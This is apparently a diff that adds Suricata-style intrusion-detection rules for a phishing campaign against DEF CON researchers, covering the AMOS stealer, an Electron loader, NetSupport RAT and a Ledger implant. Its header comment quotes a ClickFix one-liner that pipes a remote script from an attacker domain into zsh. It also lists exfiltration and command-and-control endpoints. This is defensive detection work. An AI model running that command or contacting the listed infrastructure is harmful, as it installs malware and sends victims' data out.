@@ -1,0 +1,108 @@
+# defcon-docsend-phish.rules
+# ----------------------------------------------------------------------------
+# Post-DEF CON researcher phishing — fake CoinDesk exec on X → Google Doc
+# Apps Script "DecryptPanel" sidebar → AMOS (macOS) / DocSend-themed Electron
+# loader (Windows) staging NetSupport RAT, a TLS-intercepting proxy and a
+# Ledger Live implant. Disclosed 2026-08-19 by Huntress.
+#
+# Network shape:
+#   macOS   : curl -fsSL https://apple-googleapi.com/i | zsh (ClickFix)
+#             POST http://86.54.25.213/log                    (AMOS exfil)
+#             GET  http://192.253.248.181/api/v1/getscpt/<user> (backdoor cfg)
+#   Windows : POST https://docsend.web12api.com/api/launcher/start
+#             GET  https://eu03hub.com/get_file?file=<id>     (stage-2 archives)
+#             GET  https://eu07connect.com/api/commands/<bot> (Ledger implant)
+#             NetSupport gateways msedgewebview1.pro / msedgewebview2.pro
+#             (87.120.104.88) on 443, cleartext HTTP — not TLS.
+#
+#   sid 9000901 — HTTP  /api/v1/getscpt/ to the macOS bot host
+#   sid 9000902 — HTTP  POST /log to the AMOS panel host 86.54.25.213
+#   sid 9000903 — HTTP  /api/launcher/start on a web12api.com host
+#   sid 9000904 — HTTP  /get_file?file= on eu03hub.com / eu02hub.com
+#   sid 9000905 — HTTP  /api/commands/ on eu07connect.com
+#   sid 9000906 — HTTP  NetSupport CMD=POLL to an msedgewebview*.pro gateway
+#   sid 9000907 — TLS   SNI for the delivery / C2 domains
+#   sid 9000908 — DNS   query for the delivery / C2 domains
+#   sid 9000909 — IP    traffic to the three named infrastructure hosts
+#
+# Scope: HTTP rules need plaintext or decrypted traffic; sids 9000907-9000909
+# catch the encrypted paths by metadata only.
+# ----------------------------------------------------------------------------
+
+alert http any any -> any any ( \
+    msg:"DEFCON-DOCSEND-PHISH macOS backdoor config fetch /api/v1/getscpt/"; \
+    flow:to_server,established; \
+    content:"/api/v1/getscpt/"; http_uri; \
+    reference:url,www.huntress.com/blog/defcon-phishing-google-doc-malware; \
+    classtype:trojan-activity; \
+    sid:9000901; rev:1;)
+
+alert http any any -> 86.54.25.213 any ( \
+    msg:"DEFCON-DOCSEND-PHISH AMOS exfil POST /log to panel host 86.54.25.213"; \
+    flow:to_server,established; \
+    content:"POST"; http_method; \
+    content:"/log"; http_uri; \
+    reference:url,www.huntress.com/blog/defcon-phishing-google-doc-malware; \
+    classtype:trojan-activity; \
+    sid:9000902; rev:1;)
+
+alert http any any -> any any ( \
+    msg:"DEFCON-DOCSEND-PHISH Electron loader host profile POST /api/launcher/start (web12api.com)"; \
+    flow:to_server,established; \
+    content:"web12api.com"; http_host; \
+    content:"/api/launcher/start"; http_uri; \
+    reference:url,www.huntress.com/blog/defcon-phishing-google-doc-malware; \
+    classtype:trojan-activity; \
+    sid:9000903; rev:1;)
+
+alert http any any -> any any ( \
+    msg:"DEFCON-DOCSEND-PHISH stage-2 archive fetch /get_file?file= (eu0Xhub.com)"; \
+    flow:to_server,established; \
+    content:"hub.com"; http_host; \
+    pcre:"/(?:^|\.)eu0[0-9]hub\.com$/W"; \
+    content:"/get_file?file="; http_uri; \
+    reference:url,www.huntress.com/blog/defcon-phishing-google-doc-malware; \
+    classtype:trojan-activity; \
+    sid:9000904; rev:1;)
+
+alert http any any -> any any ( \
+    msg:"DEFCON-DOCSEND-PHISH Ledger Live implant tasking /api/commands/ (eu07connect.com)"; \
+    flow:to_server,established; \
+    content:"eu07connect.com"; http_host; \
+    content:"/api/commands/"; http_uri; \
+    reference:url,www.huntress.com/blog/defcon-phishing-google-doc-malware; \
+    classtype:trojan-activity; \
+    sid:9000905; rev:1;)
+
+alert http any any -> any any ( \
+    msg:"DEFCON-DOCSEND-PHISH NetSupport RAT gateway poll to msedgewebview*.pro"; \
+    flow:to_server,established; \
+    content:"msedgewebview"; http_host; \
+    content:".pro"; http_host; \
+    content:"CMD=POLL"; http_client_body; nocase; \
+    reference:url,www.huntress.com/blog/defcon-phishing-google-doc-malware; \
+    classtype:trojan-activity; \
+    sid:9000906; rev:1;)
+
+alert tls any any -> any any ( \
+    msg:"DEFCON-DOCSEND-PHISH TLS SNI to delivery/C2 domain"; \
+    flow:to_server,established; \
+    tls.sni; \
+    pcre:"/(?:^|\.)(?:apple-googleapi\.com|docsend\.online|web12api\.com|eu0[0-9]hub\.com|eu07connect\.com|msedgewebview[0-9]\.pro|gapidriver\.com|1foqo\.lat|2fksf\.lat|3pqow\.lat)$/i"; \
+    reference:url,www.huntress.com/blog/defcon-phishing-google-doc-malware; \
+    classtype:trojan-activity; \
+    sid:9000907; rev:1;)
+
+alert dns any any -> any any ( \
+    msg:"DEFCON-DOCSEND-PHISH DNS query for delivery/C2 domain"; \
+    dns.query; \
+    pcre:"/(?:^|\.)(?:apple-googleapi\.com|docsend\.online|web12api\.com|eu0[0-9]hub\.com|eu07connect\.com|msedgewebview[0-9]\.pro|gapidriver\.com|1foqo\.lat|2fksf\.lat|3pqow\.lat)$/i"; \
+    reference:url,www.huntress.com/blog/defcon-phishing-google-doc-malware; \
+    classtype:trojan-activity; \
+    sid:9000908; rev:1;)
+
+alert ip any any -> [86.54.25.213,192.253.248.181,87.120.104.88] any ( \
+    msg:"DEFCON-DOCSEND-PHISH traffic to campaign infrastructure IP (AMOS panel / bot host / NetSupport gateway)"; \
+    reference:url,www.huntress.com/blog/defcon-phishing-google-doc-malware; \
+    classtype:trojan-activity; \
+    sid:9000909; rev:1;)
